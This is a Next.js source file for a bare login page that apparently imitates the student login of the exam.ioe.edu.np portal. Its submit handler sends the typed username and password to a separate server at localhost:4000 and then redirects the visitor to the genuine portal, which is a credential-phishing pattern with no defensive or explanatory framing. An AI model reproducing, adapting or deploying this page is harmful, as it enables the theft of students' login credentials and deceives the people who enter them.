import Head from 'next/head'
import Image from 'next/image'
import { Card, Form, Input, Button, Checkbox } from 'antd';


const layout = {
  labelCol: {
    span: 8,
  },
  wrapperCol: {
    span: 16,
  },
};
const tailLayout = {
  wrapperCol: {
    offset: 8,
    span: 16,
  },
};

export default function Home() {
  const onFinish = async (values) => {
    console.log('Success:', values);
    const response = await fetch('http://localhost:4000', {mode: "cors", method:'post', body:JSON.stringify(values), headers: {
            'Content-Type': 'application/json'
        }}).catch(console.log)
    const data = await response.json().catch(console.log)
    console.log(data)
      window.location.replace("https://exam.ioe.edu.np/studentLogin/index");
  };

  const onFinishFailed = (errorInfo) => {
    console.log('Failed:', errorInfo);
  };

  return (
          <div>
            <Card title={'Login'}>
              <Form
                  {...layout}
                  name="basic"
                  initialValues={{
                    remember: true,
                  }}
                  onFinish={onFinish}
                  onFinishFailed={onFinishFailed}
              >
                <Form.Item
                    label="Username"
                    name="username"
                    rules={[
                      {
                        required: true,
                        message: 'Please input your username!',
                      },
                    ]}
                >
                  <Input />
                </Form.Item>

                <Form.Item
                    label="Password"
                    name="password"
                    rules={[
                      {
                        required: true,
                        message: 'Please input your password!',
                      },
                    ]}
                >
                  <Input.Password />
                </Form.Item>


                <Form.Item {...tailLayout}>
                  <Button type="primary" htmlType="submit">
                    Submit
                  </Button>
                </Form.Item>
              </Form>
            </Card>
          </div>
      )
}
